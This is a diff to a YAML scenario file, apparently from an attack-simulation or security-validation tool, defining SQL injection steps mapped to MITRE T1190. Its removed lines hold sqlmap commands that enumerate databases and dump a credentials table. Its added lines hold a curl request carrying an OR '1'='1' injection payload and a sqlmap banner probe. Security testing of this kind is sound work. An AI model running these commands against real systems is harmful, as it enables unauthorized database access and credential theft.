@@ -1,16 +1,17 @@
 id: scn-sqli-04
-name: Exploit Public-Facing Application (SQL Injection)
-description: Automated sqlmap probe extracting database schema and credentials via HTTP parameters.
+name: Exploit Public-Facing Application (SQL Injection Probe)
+description: Automated SQL injection security validation against web endpoints.
 mitre_tactic: TA0001
 mitre_technique: T1190
+required_services: ["80", "443", "8080", "http", "web"]
 steps:
   - step: 1
-    action: "sqlmap -u 'http://target-pod:8080/api/users?id=1' --batch --dbs"
-    tool: "sqlmap"
+    action: "curl -s -m 5 'http://{TARGET}:8080/api/users?id=1%27+OR+%271%27=%271'"
+    tool: "curl"
     delay_ms: 1200
-    expected_output: "[*] Parameter 'id' is vulnerable (AND/OR time-based blind). Available databases: [3]: information_schema, app_db, users_vault"
+    expected_output: "[*] HTTP 200 response with parameters inspected for injection patterns"
   - step: 2
-    action: "sqlmap -u 'http://target-pod:8080/api/users?id=1' --dump -D users_vault -T credentials"
+    action: "sqlmap -u 'http://{TARGET}:8080/api/users?id=1' --batch --banner"
     tool: "sqlmap"
     delay_ms: 1400
-    expected_output: "[+] Dumped 4 entries from table credentials: admin / $2a$12$e89... / active"
+    expected_output: "[*] SQLMap probe executed against target endpoint"
